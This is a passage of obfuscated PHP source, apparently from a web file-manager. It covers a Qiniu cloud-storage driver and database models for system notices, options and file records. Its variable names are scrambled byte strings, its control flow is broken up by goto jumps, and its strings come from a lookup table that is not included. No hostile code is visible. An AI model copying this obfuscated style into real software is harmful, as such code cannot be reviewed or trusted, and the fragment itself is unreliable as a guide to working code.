$E‰™ÉèàÇÉ, $C´ıÜ∞Ô–ª); } goto bñÕÔîÖ‹»; DÃó¬™≤¯õ: } foreach ($d∆¬·åîç¥ as $E‰™ÉèàÇÉ) { if ($E‰™ÉèàÇÉ == $cÑÊõÒ¬„∏) { continue; } $e¿∞∑¯©“€[] = $E‰™ÉèàÇÉ; if ($cê‰ÜªÉß÷) { $this->cacheMethod($Bˆ◊àéüú„[199], $E‰™ÉèàÇÉ, !0); } } if ($e«⁄≤î•§“ === $Bˆ◊àéüú„[33]) { break; } } if ($cê‰ÜªÉß÷) { $this->cacheMethod($Bˆ◊àéüú„[199], $b£≤ä¬Öç—, !0); } goto Dæ…ÿÎö∆; fÆ…∂¨™∆⁄: $Bˆ◊àéüú„ =& $_SERVER[’ÿƒ†ïò]; $b£≤ä¬Öç— = trim($b£≤ä¬Öç—, $Bˆ◊àéüú„[8]); $cÑÊõÒ¬„∏ = empty($b£≤ä¬Öç—) && $b£≤ä¬Öç— !== $Bˆ◊àéüú„[191] ? $Bˆ◊àéüú„[33] : $b£≤ä¬Öç— . $Bˆ◊àéüú„[8]; goto dªË„ÆÔ√À; dªË„ÆÔ√À: $e«⁄≤î•§“ = $Bˆ◊àéüú„[33]; $aÍì¡∞ÓËü = 1000; $cê‰ÜªÉß÷ = $this->listItemCache === !1 ? !1 : !0; goto D£≥⁄ùæ∂; A∆ÁÈÕÇÌò: } public function canRead($eπÌ· €ã∑) { return $this->exist($eπÌ· €ã∑) ? !0 : !1; } public function canWrite($cú◊≤ÉÇ®») { return $this->exist($cú◊≤ÉÇ®») ? !0 : !1; } public function getContent($EÑÑí’µÉÖ) { return $this->fileSubstr($EÑÑí’µÉÖ, 0, -1); } public function setContent($Eú∂∂Ì™’ë, $DªƒÏ©…éø = '') { $BµÊåºï¡µ = $this->tempFile($this->pathThis($Eú∂∂Ì™’ë)); file_put_contents($BµÊåºï¡µ, $DªƒÏ©…éø); if ($this->upload($Eú∂∂Ì™’ë, $BµÊåºï¡µ)) { $this->tempFileRemve($BµÊåºï¡µ); return !0; } return !1; } public function refreshUrls($bæπîÀ∏≠˘) { goto f’ÉƒçÿâÑ; FﬂÊ≤ÇÖÓÆ: $BòÖ¬‚’úÑ = new Qiniu\Cdn\CdnManager($this->auth); list($c©ÛÏè¬åÏ, $cõ∫∆ÑÉÎø) = $BòÖ¬‚’úÑ->refreshUrls($eÁ’ù¨“áπ); if ($cõ∫∆ÑÉÎø) { return !1; } goto eïı∑öÎ∆ö; eïı∑öÎ∆ö: return $c©ÛÏè¬åÏ[$e¥˜ß§÷¯†[1106]] == $e¥˜ß§÷¯†[748] ? !0 : !1; goto a£ﬁè˘©ﬂƒ; f’ÉƒçÿâÑ: $e¥˜ß§÷¯† =& $_SERVER[’ÿƒ†ïò]; $eÁ’ù¨“áπ = array(); if (is_array($bæπîÀ∏≠˘)) { foreach ($bæπîÀ∏≠˘ as $D·Ö§©Êñ‘) { $eÁ’ù¨“áπ[] = $this->link($D·Ö§©Êñ‘); } } else { $eÁ’ù¨“áπ[] = $this->link($bæπîÀ∏≠˘); } goto FﬂÊ≤ÇÖÓÆ; a£ﬁè˘©ﬂƒ: } public function fileSubstr($EâùÒÑéá«, $Eù◊¢Èï—”, $FÈ…á•–ÒÉ) { $Aµı£Îí€å =& $_SERVER[’ÿƒ†ïò]; if (!($F¯‰»∂Ïó∆ = $this->link($EâùÒÑéá«))) { return !1; } $bøäæÀ√µè = !1; if ($FÈ…á•–ÒÉ > 0) { $bûùåÖ∑çé = $Eù◊¢Èï—” + $FÈ…á•–ÒÉ - 1; $bøäæÀ√µè = array($Aµı£Îí€å[1336] . $Eù◊¢Èï—” . $Aµı£Îí€å[454] . $bûùåÖ∑çé); } $a°«â·‰–È = url_request($F¯‰»∂Ïó∆, $Aµı£Îí€å[228], !1, $bøäæÀ√µè); return $a°«â·‰–È[$Aµı£Îí€å[738]] ? $a°«â·‰–È[$Aµı£Îí€å[1116]] : !1; } public function upload($D£ù°–Â≈á, $fµˆâÍÁª√, $B°æÁƒîêË = false, $c≠ˆ©ﬂ•Íπ = REPEAT_REPLACE) { $aÙ ‹¢åÍô = new Qiniu\Storage\UploadManager(); $e‹áüã®ƒé = $this->auth->uploadToken($this->bucket, $D£ù°–Â≈á); $BóÚÊ»Ñœõ = get_file_mime(get_path_ext($fµˆâÍÁª√)); list($A¨≈∏†©Ö∫, $e…¨∞·πÌµ) = $aÙ ‹¢åÍô->putFile($e‹áüã®ƒé, $D£ù°–Â≈á, $fµˆâÍÁª√, null, $BóÚÊ»Ñœõ); return $e…¨∞·πÌµ ? !1 : $this->getPathOuter($D£ù°–Â≈á); } public function uploadFormData($E‰üÁ‘û“√, $AŒÔ∏öåÀÒ = 3600) { return $this->uploadToken($E‰üÁ‘û“√, $AŒÔ∏öåÀÒ); } public function multiUploadFormData($fﬂ§¨’§√◊, $A«Øö∫ºê∑ = 3600) { return $this->uploadToken($fﬂ§¨’§√◊, $A«Øö∫ºê∑); } private function uploadToken($DøÌÇÕêèÌ, $DÜûƒàπú¶ = 3600) { goto B»ﬁ¥ôÚ£ö; eè∆Ñª›¥ã: $eä∂¡ƒ ·® = http_type() . "\x3a\57\57\165\160\x6c\157\141\144{$EÁÜ’ø¥íì}\x2e\161\151\x6e\151\165\160\56\x63\157\x6d\x2f"; return array($aÖ¿›ÎΩ˜∂[1340] => $CõÇ°àºÜ≥, $aÖ¿›ÎΩ˜∂[1341] => $eä∂¡ƒ ·®); goto eÃ†ﬁœ≠ë√; B»ﬁ¥ôÚ£ö: $aÖ¿›ÎΩ˜∂ =& $_SERVER[’ÿƒ†ïò]; $füÑ≥ô¶—… = $DÜûƒàπú¶; $fÀ“ÎÖ¿»é = array($aÖ¿›ÎΩ˜∂[1337] => $aÖ¿›ÎΩ˜∂[1338]); goto dŒ·—ﬂ–®ê; dŒ·—ﬂ–®ê: $cï∫ï˘»¥— = $DøÌÇÕêèÌ; $CõÇ°àºÜ≥ = $this->auth->uploadToken($this->bucket, $cï∫ï˘»¥—, $füÑ≥ô¶—…, $fÀ“ÎÖ¿»é, !0); $EÁÜ’ø¥íì = empty($this->region) || $this->region == $aÖ¿›ÎΩ˜∂[1339] ? $aÖ¿›ÎΩ˜∂[33] : $aÖ¿›ÎΩ˜∂[454] . $this->region; goto eè∆Ñª›¥ã; eÃ†ﬁœ≠ë√: } public function download($Cö¨æê∂§í, $b†ÑñˆêÉ§) { goto bÔË•ÓïÛﬂ; b«É™»®˜∑: $DÛüöäàÿÒ = 1024 * 200; $Dø¬”ÿŒáÍ = fopen($eäáÆæõéô, $_SERVER[’ÿƒ†ïò][1342]); while (!0) { $c◊´ëì≠⁄¨ = $this->fileSubstr($Cö¨æê∂§í, $e’∂éèÍ‚Ë, $DÛüöäàÿÒ); if ($c◊´ëì≠⁄¨ === !1) { return !1; } fwrite($Dø¬”ÿŒáÍ, $c◊´ëì≠⁄¨); $e’∂éèÍ‚Ë += $DÛüöäàÿÒ; if (strlen($c◊´ëì≠⁄¨) < $DÛüöäàÿÒ) { break; } } goto açàÚÙ˜Øá; açàÚÙ˜Øá: fclose($Dø¬”ÿŒáÍ); return $b†ÑñˆêÉ§; goto DÔ›∫à«∏‡; bÔË•ÓïÛﬂ: $eäáÆæõéô = IO::getPathInner(IO::mkfile($b†ÑñˆêÉ§)); if (!($aÇ•≥˜Â¨è = $this->link($Cö¨æê∂§í))) { return !1; } $e’∂éèÍ‚Ë = 0; goto b«É™»®˜∑; DÔ›∫à«∏‡: } public function link($a·¡ÎÔ±øæ, $d™›ó‹£Æâ = '') { if (!$this->isFile($a·¡ÎÔ±øæ)) { return !1; } $Aæ¿æö êƒ = $this->getHost() . $_SERVER[’ÿƒ†ïò][8] . $this->pathEncode($a·¡ÎÔ±øæ) . $d™›ó‹£Æâ; return $this->auth->privateDownloadUrl($Aæ¿æö êƒ, 3600 * 12); } public function fileOut($D∑ôπÖøâ∫, $fôΩ·‹é‡Ú = false, $AÃÔî…˜õ≠ = false, $Dƒ–Òø¨Ø¡ = '') { $e◊…õÎÊÑì =& $_SERVER[’ÿƒ†ïò]; if ($this->isFileOutServer()) { return $this->fileOutServer($D∑ôπÖøâ∫, $fôΩ·‹é‡Ú, $AÃÔî…˜õ≠, $Dƒ–Òø¨Ø¡); } if (!$AÃÔî…˜õ≠) { $AÃÔî…˜õ≠ = $this->pathThis($D∑ôπÖøâ∫); } $e∞ÜÃ˜‘·˘ = $fôΩ·‹é‡Ú ? $e◊…õÎÊÑì[1343] . rawurlencode($AÃÔî…˜õ≠) : $e◊…õÎÊÑì[33]; $e≥ï·¥∫Ùº = $this->link($D∑ôπÖøâ∫, $e∞ÜÃ˜‘·˘); $this->fileOutLink($e≥ï·¥∫Ùº); } public function fileOutServer($eÚ≤ç‡ºŸ˘, $fáæÎ≥πî = false, $bÒ«ëÓ–ïõ = false, $bâêÂã”±≈ = '') { parent::fileOut($eÚ≤ç‡ºŸ˘, $fáæÎ≥πî, $bÒ«ëÓ–ïõ, $bâêÂã”±≈); } public function fileOutImage($dæ—óÂçê¢, $aÂ™Ìµü∫  = 250) { $Aª˜‡€öí  = $this->link($dæ—óÂçê¢, $_SERVER[’ÿƒ†ïò][1344] . $aÂ™Ìµü∫ ); $this->fileOutLink($Aª˜‡€öí ); } public function fileOutImageServer($A¬¶ÕÜô«—, $F∫•∑ëì◊È = 250) { parent::fileOutImage($A¬¶ÕÜô«—, $F∫•∑ëì◊È); } public function hashMd5($e≠≈ÙªÛ”ì) { $aâá•Ö⁄êÃ =& $_SERVER[’ÿƒ†ïò]; $d¶Ü◊¿æ√ï = $this->objectMeta($e≠≈ÙªÛ”ì); return isset($d¶Ü◊¿æ√ï[$aâá•Ö⁄êÃ[208]]) ? $d¶Ü◊¿æ√ï[$aâá•Ö⁄êÃ[208]] : !1; $bÒãí†ÀΩè = $this->link($e≠≈ÙªÛ”ì, $aâá•Ö⁄êÃ[1345]); } public function size($C∑ã°Ùàã¨) { $D”∆¿∆¯Æâ = $this->objectMeta($C∑ã°Ùàã¨); return $D”∆¿∆¯Æâ ? $D”∆¿∆¯Æâ[$_SERVER[’ÿƒ†ïò][78]] : 0; } public function info($Fêßß«œÉ£) { if ($this->isFolder($Fêßß«œÉ£)) { return $this->folderInfo($Fêßß«œÉ£); } else { if ($this->isFile($Fêßß«œÉ£)) { return $this->fileInfo($Fêßß«œÉ£); } } return !1; } public function exist($Dÿë˘∏©îÈ) { return $this->isFile($Dÿë˘∏©îÈ) || $this->isFolder($Dÿë˘∏©îÈ); } public function isFile($A…∞ñéÚÀ∫) { return !$this->isFolder($A…∞ñéÚÀ∫) && $this->objectMeta($A…∞ñéÚÀ∫); } public function isFolder($b£∑ﬂ··ÿ¥) { return $this->cacheMethod($_SERVER[’ÿƒ†ïò][199], $b£∑ﬂ··ÿ¥); } protected function objectMeta($eÆ∂„í¢æ¬) { return $this->cacheMethod($_SERVER[’ÿƒ†ïò][200], $eÆ∂„í¢æ¬); } protected function _objectMeta($E‚éˆ≤€®È) { $fèÂÒääﬂú =& $_SERVER[’ÿƒ†ïò]; list($B»—Ì’∏åº, $FÖıÖƒòßæ) = $this->bucketManager->stat($this->bucket, $E‚éˆ≤€®È); if ($B»—Ì’∏åº) { $B»—Ì’∏åº[$fèÂÒääﬂú[78]] = intval($B»—Ì’∏åº[$fèÂÒääﬂú[1331]]); } return $B»—Ì’∏åº; } protected function _isFolder($B∫–ú§÷≤¿) { $DÑÚÀ‰ñ‡« =& $_SERVER[’ÿƒ†ïò]; if ($B∫–ú§÷≤¿ == $DÑÚÀ‰ñ‡«[33] || $B∫–ú§÷≤¿ == $DÑÚÀ‰ñ‡«[8]) { return !0; } list($eˆ…±”Î†Ω, $Cƒåâ€Áõè) = $this->bucketManager->listFiles($this->bucket, trim($B∫–ú§÷≤¿, $DÑÚÀ‰ñ‡«[8]) . $DÑÚÀ‰ñ‡«[8], $DÑÚÀ‰ñ‡«[33], 1, $DÑÚÀ‰ñ‡«[8]); return !empty($eˆ…±”Î†Ω[$DÑÚÀ‰ñ‡«[1334]]) || !empty($eˆ…±”Î†Ω[$DÑÚÀ‰ñ‡«[1335]]) ? !0 : !1; } } goto d”¡ﬁ≠©‚©; F‚ıëáı≈ƒ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x6e\x6f\x74\151\x63\145\x4c\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\x63\x6f\x6e\x74\145\x6e\x74", "\141\x75\164\150", "\x6d\157\144\x65", "\x74\151\x6d\x65", "\x74\x79\x70\x65", "\154\x65\166\145\x6c", "\145\156\141\142\154\145", "\163\x6f\162\164"); public function listData($e›û≥è¨—Ó = false, $d†Ω√é¯À‚ = "\x73\x6f\x72\164", $DÒ§Á’üÉ¢ = false) { return parent::listData($e›û≥è¨—Ó, $d†Ω√é¯À‚, $DÒ§Á’üÉ¢); } public function add($f…ÂˆÇÀ£ﬂ) { $B…–°π“˘ã =& $_SERVER[’ÿƒ†ïò]; $c∑ùﬂŸﬂå = time(); if ($f…ÂˆÇÀ£ﬂ[$B…–°π“˘ã[12]] == $B…–°π“˘ã[2136]) { $c∑ùﬂŸﬂå = strtotime($f…ÂˆÇÀ£ﬂ[$B…–°π“˘ã[197]]); } $f…ÂˆÇÀ£ﬂ[$B…–°π“˘ã[197]] = $c∑ùﬂŸﬂå; return parent::insert($f…ÂˆÇÀ£ﬂ); } public function update($eç—◊¨ãÉã, $f‡£ëê„ÈÆ) { goto E“§ªÔËÒÕ; a„Â†À≥ãú: return parent::update($eç—◊¨ãÉã, $f‡£ëê„ÈÆ); goto Bπ—û´∆—è; E“§ªÔËÒÕ: $dÜÉŸ·Œâ” =& $_SERVER[’ÿƒ†ïò]; $eå¿¢®ÖÖ∫ = $this->listData($eç—◊¨ãÉã); if (!$eå¿¢®ÖÖ∫) { return !1; } goto EÙú¯µÆ¥ÿ; EÙú¯µÆ¥ÿ: $A⁄í¡¢¢±© = time(); if ($f‡£ëê„ÈÆ[$dÜÉŸ·Œâ”[12]] == $dÜÉŸ·Œâ”[2136]) { $A⁄í¡¢¢±© = strtotime($f‡£ëê„ÈÆ[$dÜÉŸ·Œâ”[197]]); } $f‡£ëê„ÈÆ[$dÜÉŸ·Œâ”[197]] = $A⁄í¡¢¢±©; goto a„Â†À≥ãú; Bπ—û´∆—è: } public function remove($F©ùüüÔ•Œ) { $DÏÒç√Ç≠Ê = $this->listData($F©ùüüÔ•Œ); if (!$DÏÒç√Ç≠Ê || $DÏÒç√Ç≠Ê[$_SERVER[’ÿƒ†ïò][1199]]) { return !1; } return parent::remove($F©ùüüÔ•Œ); } public function sort($Dñò‹‹ëÙ„, $b¬ËáÓ—ªÙ) { return parent::update($Dñò‹‹ëÙ„, $b¬ËáÓ—ªÙ); } public function enable($EÎê®…Êˆ , $eÜ¡§ªâüÚ) { return parent::update($EÎê®…Êˆ , array($_SERVER[’ÿƒ†ïò][2137] => $eÜ¡§ªâüÚ)); } private function initUserOption() { $C≠ﬂÈµì√ =& $_SERVER[’ÿƒ†ïò]; $this->optionType = $C≠ﬂÈµì√[2138]; $this->modelType = $C≠ﬂÈµì√[2139]; $this->field = array($C≠ﬂÈµì√[2140], $C≠ﬂÈµì√[28], $C≠ﬂÈµì√[197], $C≠ﬂÈµì√[29], $C≠ﬂÈµì√[2141], $C≠ﬂÈµì√[738], $C≠ﬂÈµì√[189]); } public function userNoticeGet($a∂ìà’„±† = false) { $this->initUserOption(); return parent::listData($a∂ìà’„±†, $_SERVER[’ÿƒ†ïò][395], !0); } public function userNoticeAdd($FÁÜø‘æÚ∞) { $B‘ä∞ÉûäÆ =& $_SERVER[’ÿƒ†ïò]; $this->initUserOption(); $f‘Æ¬ÈÚÒˆ = $this->findByKey($B‘ä∞ÉûäÆ[2140], $FÁÜø‘æÚ∞[$B‘ä∞ÉûäÆ[395]]); if ($f‘Æ¬ÈÚÒˆ) { return !0; } $bãŒ◊Ïáøå = array($B‘ä∞ÉûäÆ[2140] => $FÁÜø‘æÚ∞[$B‘ä∞ÉûäÆ[395]], $B‘ä∞ÉûäÆ[28] => $FÁÜø‘æÚ∞[$B‘ä∞ÉûäÆ[28]], $B‘ä∞ÉûäÆ[197] => $FÁÜø‘æÚ∞[$B‘ä∞ÉûäÆ[197]], $B‘ä∞ÉûäÆ[29] => isset($FÁÜø‘æÚ∞[$B‘ä∞ÉûäÆ[29]]) ? $FÁÜø‘æÚ∞[$B‘ä∞ÉûäÆ[29]] : 1, $B‘ä∞ÉûäÆ[2141] => isset($FÁÜø‘æÚ∞[$B‘ä∞ÉûäÆ[2141]]) ? $FÁÜø‘æÚ∞[$B‘ä∞ÉûäÆ[2141]] : 0, $B‘ä∞ÉûäÆ[738] => 0, $B‘ä∞ÉûäÆ[189] => 0); return parent::insert($bãŒ◊Ïáøå); } public function userNoticeEdit($DÈΩí«í∏Á, $fØóÌÉæ√”) { $this->initUserOption(); return parent::update($DÈΩí«í∏Á, $fØóÌÉæ√”); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\145\155\x5f\x6f\x70\164\151\x6f\x6e"; protected $jsonField = array("\x6d\x65\x6e\165", "\x72\157\x6c\x65", "\162\157\154\145\x47\x72\157\165\160", "\162\x65\147\x69\163\x74", "\x65\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($aÔﬁì¢ÃÛÑ) { return "\123\171\x73\164\145\155\x4f\160\x74\151\157\x6e\137{$aÔﬁì¢ÃÛÑ}"; } protected function optionDefault($e∏·í÷•¥› = '') { $F≤Ô◊ù‰∞å =& $_SERVER[’ÿƒ†ïò]; if ($e∏·í÷•¥› == $F≤Ô◊ù‰∞å[33]) { return $GLOBALS[$F≤Ô◊ù‰∞å[6]][$F≤Ô◊ù‰∞å[379]]; } } } class SystemRecordModel extends ModelBaseLight { } goto c≠ØË–ïƒç; bπê´áÛôÎ: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\x6c\x65\x5f\x63\157\156\164\x65\x6e\x74\x73"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\x54\151\x6d\145", "\x74\x69\x6d\145", "\151\x6e\x73\145\162\x74", "\x66\x75\x6e\x63\x74\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\x6c\x65"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\141\x6d\x65" => "\151\x6f\137\x66\x69\x6c\x65\137\x6d\x65\164\141", "\x6d\x65\164\x61\x46\x69\145\x6c\144" => "\x66\x69\x6c\145\111\x44"); public function fileInfo($E´åÎ“∑´ô) { $Cú⁄ùçëç =& $_SERVER[’ÿƒ†ïò]; static $Açß§üÖµÑ = array(); if (!isset($Açß§üÖµÑ[$E´åÎ“∑´ô])) { $EÉéÃ¨œó„ = $Cú⁄ùçëç[1774]; $EéÚ¯äã¯ë = Model($Cú⁄ùçëç[464])->field($EÉéÃ¨œó„)->where(array($Cú⁄ùçëç[462] => $E´åÎ“∑´ô))->find(); $Açß§üÖµÑ[$E´åÎ“∑´ô] = $EéÚ¯äã¯ë; } return $Açß§üÖµÑ[$E´åÎ“∑´ô]; } public function addFileByContent($a°ñ¨ÛÖÑ‡ = '', $aíõœäÏÊÿ = '') { goto a·€„¬ΩÆ°; f¯¿íÕˆí: if (file_exists($Cßπ¯ÑÙÿΩ)) { @unlink($Cßπ¯ÑÙÿΩ); } return $a»Ê˘ﬂÜëÊ; goto AÉœö…æÃö; a·€„¬ΩÆ°: $Cãó⁄¢Û¡Û =& $_SERVER[’ÿƒ†ïò]; $fÆµçë’ô‡ = TEMP_PATH . $Cãó⁄¢Û¡Û[1775]; if (!is_dir($fÆµçë’ô‡)) { mk_dir($fÆµçë’ô‡); } goto bÜœ÷°Œ‘†; bÜœ÷°Œ‘†: $Cßπ¯ÑÙÿΩ = $fÆµçë’ô‡ . $Cãó⁄¢Û¡Û[1776] . rand_string(16); file_put_contents($Cßπ¯ÑÙÿΩ, $a°ñ¨ÛÖÑ‡); $a»Ê˘ﬂÜëÊ = $this->addFile($Cßπ¯ÑÙÿΩ, $aíõœäÏÊÿ, !0); goto f¯¿íÕˆí; AÉœö…æÃö: } public function createFileName($eÉÓäÖæÇä, $cÌºôí´ä∫ = false, $EÑïñç≥Ωæ = false) { goto c ˜õ◊ëè®; c ˜õ◊ëè®: $B–ë ë°ÜÕ =& $_SERVER[’ÿƒ†ïò]; $B≥˜°ØàéÒ = IO::init($B–ë ë°ÜÕ[8]); $e‰Í§óêÃ± = $this->makeFilePath($eÉÓäÖæÇä, $B≥˜°ØàéÒ, $cÌºôí´ä∫, $EÑïñç≥Ωæ); goto C¯ÍÎÉ÷óë; C¯ÍÎÉ÷óë: $C€ÑÕﬂä∂Ö = $B≥˜°ØàéÒ->pathFather($e‰Í§óêÃ±); static $e®‹Âô©Ô¬ = false; $EÙ¥‹∞Ü•ˆ = $B–ë ë°ÜÕ[1777] . md5($C€ÑÕﬂä∂Ö); goto eû„Ì√Ÿ†É; eû„Ì√Ÿ†É: if (!$e®‹Âô©Ô¬ && !Cache::get($EÙ¥‹∞Ü•ˆ)) { $e®‹Âô©Ô¬ = !0; $F¬‡∏âÜìÓ = IO::mkdir($C€ÑÕﬂä∂Ö); if (!IO::exist($F¬‡∏âÜìÓ . $B–ë ë°ÜÕ[791])) { IO::mkfile($F¬‡∏âÜìÓ . $B–ë ë°ÜÕ[791]); } Cache::set($EÙ¥‹∞Ü•ˆ, 1, 3600 * 2); } return $e‰Í§óêÃ±; goto c±ΩáŸ÷éº; c±ΩáŸ÷éº: } public function makeFilePath($B£√µﬂ›ëˆ, $BÜæâ¢ÓΩè, $a⁄¯Ω–±“ß = false, $f∞ÖÕâ⁄±· = false) { goto Fƒ‰µ˜…Ñ∏; E¿’«ª‰«˜: if (!$B£√µﬂ›ëˆ) { $aÙÑÀ¯óã” = $fé—¿◊©Ç∆[1780]; } switch ($aÙÑÀ¯óã”) { case $fé—¿◊©Ç∆[1781]: $añâ¥ÜóëÁ = $añâ¥ÜóëÁ . $fé—¿◊©Ç∆[95] . $BÜæâ¢ÓΩè->ext($B£√µﬂ›ëˆ); if ($dÖ¢ª£∫ﬂ◊ == $fé—¿◊©Ç∆[1716]) { $añâ¥ÜóëÁ .= $fé—¿◊©Ç∆[1456]; } break; case $fé—¿◊©Ç∆[1782]: goto A√Ÿ∏Ãπ◊å; aï≈’ûû…: if (IO::isTypeObject($añâ¥ÜóëÁ) && !IO::isUploadServer($añâ¥ÜóëÁ)) { if (IO::exist($añâ¥ÜóëÁ)) { return $añâ¥ÜóëÁ; } $aãøèæÂçœ = IO::setContent($añâ¥ÜóëÁ, $fé—¿◊©Ç∆[33]); if (!$aãøèæÂçœ) { show_json($fé—¿◊©Ç∆[1785], !1); } } CacheLock::unlock($aÓºõœ®£Á); break; goto cÔéË≤Ë¿; f£◊È œ¬∫: $aÎ§¨≈ÀûØ = $fé—¿◊©Ç∆[1152] . $c¢¯Ê⁄çá§[$fé—¿◊©Ç∆[395]] . $fé—¿◊©Ç∆[404] . date($fé—¿◊©Ç∆[1783]) . $a¥◊∆∏ùÒ˘ . $fé—¿◊©Ç∆[8]; if ($dÖ¢ª£∫ﬂ◊ == $fé—¿◊©Ç∆[1716]) { $B£√µﬂ›ëˆ .= $fé—¿◊©Ç∆[1456]; } $aÓºõœ®£Á = $fé—¿◊©Ç∆[1784] . $aÎ§¨≈ÀûØ . $B£√µﬂ›ëˆ; goto b ¿äƒö…ı; b ¿äƒö…ı: CacheLock::lock($aÓºõœ®£Á); $añâ¥ÜóëÁ = $aÎ§¨≈ÀûØ . $B£√µﬂ›ëˆ; if (IO::exist($aÎ§¨≈ÀûØ . $B£√µﬂ›ëˆ)) { $f«êû¬ë°¥ = substr($B£√µﬂ›ëˆ, 0, strlen($B£√µﬂ›ëˆ) - strlen($dÖ¢ª£∫ﬂ◊)); $fÜ∞à¬≤°€ = $f∞ÖÕâ⁄±· ? substr($f∞ÖÕâ⁄±·, 0, 5) : ($a⁄¯Ω–±“ß ? substr($a⁄¯Ω–±“ß, 0, 5) : rand_string(5)); $añâ¥ÜóëÁ = $aÎ§¨≈ÀûØ . $f«êû¬ë°¥ . $fÜ∞à¬≤°€ . $fé—¿◊©Ç∆[95] . $dÖ¢ª£∫ﬂ◊; } goto aï≈’ûû…; A√Ÿ∏Ãπ◊å: $D£Ó≠‰Ÿû∂ = Model($fé—¿◊©Ç∆[758])->get($fé—¿◊©Ç∆[759]); $a¥◊∆∏ùÒ˘ = substr(md5($fé—¿◊©Ç∆[760] . $D£Ó≠‰Ÿû∂ . date($fé—¿◊©Ç∆[736])), 0, 8); $c¢¯Ê⁄çá§ = KodIO::defaultDriver(); goto f£◊È œ¬∫; cÔéË≤Ë¿: case $fé—¿◊©Ç∆[1780]: break; default: break; } return $añâ¥ÜóëÁ; goto FÔ∆âëäº¬; eÖ÷ÌèÖÇ: $añâ¥ÜóëÁ = $aÎ§¨≈ÀûØ . rand_string(5) . short_id(100); $B£√µﬂ›ëˆ = str_replace($fé—¿◊©Ç∆[8], $fé—¿◊©Ç∆[71], KodIO::clear($B£√µﬂ›ëˆ)); $dÖ¢ª£∫ﬂ◊ = $BÜæâ¢ÓΩè->ext($B£√µﬂ›ëˆ); goto E¿’«ª‰«˜; Fƒ‰µ˜…Ñ∏: $fé—¿◊©Ç∆ =& $_SERVER[’ÿƒ†ïò]; $aÙÑÀ¯óã” = Model($fé—¿◊©Ç∆[758])->get($fé—¿◊©Ç∆[1778]); $aÎ§¨≈ÀûØ = KodIO::defaultIO() . date($fé—¿◊©Ç∆[1779]); goto eÖ÷ÌèÖÇ; FÔ∆âëäº¬: } public function addFileByRemote($AúñË∞é„«, $bêÈ√ˆø≤», $d¡›õ°€Çœ = array()) { goto c•“Úì◊êÓ; Dé∆ÀæíÃ¨: if ($b—∑∞ôú¨ = $this->addFileCheckExist($d‹áˆ¥÷Èó[$cÈÜßùÑ“[171]], $d‹áˆ¥÷Èó[$cÈÜßùÑ“[170]], $d‹áˆ¥÷Èó[$cÈÜßùÑ“[78]])) { return $b—∑∞ôú¨; } return $this->addFileData($d‹áˆ¥÷Èó); goto FﬂâïØí¶±; c•“Úì◊êÓ: $cÈÜßùÑ“ =& $_SERVER[’ÿƒ†ïò]; if (!IO::exist($AúñË∞é„«)) { return !1; } $f∆à›ìì£Ã = $d¡›õ°€Çœ[$cÈÜßùÑ“[170]] ? $d¡›õ°€Çœ[$cÈÜßùÑ“[170]] : $cÈÜßùÑ“[33]; goto dÌÒﬁÑ•çÛ; dÌÒﬁÑ•çÛ: $aä·éòÆ∞Ω = IO::hashMd5($AúñË∞é„«, $f∆à›ìì£Ã); $cäàâÖ–à© = KodIO::defaultDriver(); $d‹áˆ¥÷Èó = array($cÈÜßùÑ“[573] => IO::size($AúñË∞é„«), $cÈÜßùÑ“[1786] => 1, $cÈÜßùÑ“[415] => $bêÈ√ˆø≤», $cÈÜßùÑ“[803] => $cäàâÖ–à©[$cÈÜßùÑ“[395]], $cÈÜßùÑ“[416] => $AúñË∞é„«, $cÈÜßùÑ“[1787] => $d¡›õ°€Çœ[$cÈÜßùÑ“[171]] ? $d¡›õ°€Çœ[$cÈÜßùÑ“[171]] : IO::hashSimple($AúñË∞é„«), $cÈÜßùÑ“[1788] => $aä·éòÆ∞Ω ? $aä·éòÆ∞Ω : $f∆à›ìì£Ã); goto Dé∆ÀæíÃ¨; FﬂâïØí¶±: } private function addFileData($Dæ¿¡ø¯‰Ÿ) { $cå¨ŸÑÎ˜÷ =& $_SERVER[’ÿƒ†ïò]; if (!$Dæ¿¡ø¯‰Ÿ) { return !1; } $Dæ¿¡ø¯‰Ÿ[$cå¨ŸÑÎ˜÷[78]] = intval($Dæ¿¡ø¯‰Ÿ[$cå¨ŸÑÎ˜÷[78]]); if (!$Dæ¿¡ø¯‰Ÿ[$cå¨ŸÑÎ˜÷[78]] && strlen($Dæ¿¡ø¯‰Ÿ[$cå¨ŸÑÎ˜÷[171]]) > 32) { $Dæ¿¡ø¯‰Ÿ[$cå¨ŸÑÎ˜÷[78]] = intval(substr($Dæ¿¡ø¯‰Ÿ[$cå¨ŸÑÎ˜÷[171]], 32)); } $DÆö—î¥Øœ = $this->add($Dæ¿¡ø¯‰Ÿ); return $this->find($DÆö—î¥Øœ); } public function addFile($Eÿë¿Ì†Ë, $AçëÓá®ãø, $d‡Úä§µÉŒ = false) { goto a⁄…é‹„◊Ö; Bß∞≠πˆáΩ: $Aç≈ΩØ÷ÁÜ = $_SERVER[’ÿƒ†ïò][1789] . $B∏ Üˆ‹õÃ; CacheLock::lock($Aç≈ΩØ÷ÁÜ); if ($EÉÇ‰™ﬂÆô = $this->addFileCheckExist($f¶åé±‚íÌ, $B∏ Üˆ‹õÃ, $aß≥™ì®≤π)) { CacheLock::unlock($Aç≈ΩØ÷ÁÜ); return $EÉÇ‰™ﬂÆô; } goto F÷¬”ø∑ôı; F÷¬”ø∑ôı: $D€—äòÑÇÆ = $this->addFileMake($Eÿë¿Ì†Ë, $aß≥™ì®≤π, $f¶åé±‚íÌ, $B∏ Üˆ‹õÃ, $AçëÓá®ãø, $d‡Úä§µÉŒ); $D‚Íäè•ÍŸ = $this->addFileData($D€—äòÑÇÆ); CacheLock::unlock($Aç≈ΩØ÷ÁÜ); goto Dí§·é∏°ë; Dí§·é∏°ë: return $D‚Íäè•ÍŸ; goto EıÜΩ≥Ùåâ; a⁄…é‹„◊Ö: $f¶åé±‚íÌ = IO::hashSimple($Eÿë¿Ì†Ë); $B∏ Üˆ‹õÃ = IO::hashMd5($Eÿë¿Ì†Ë); $aß≥™ì®≤π = 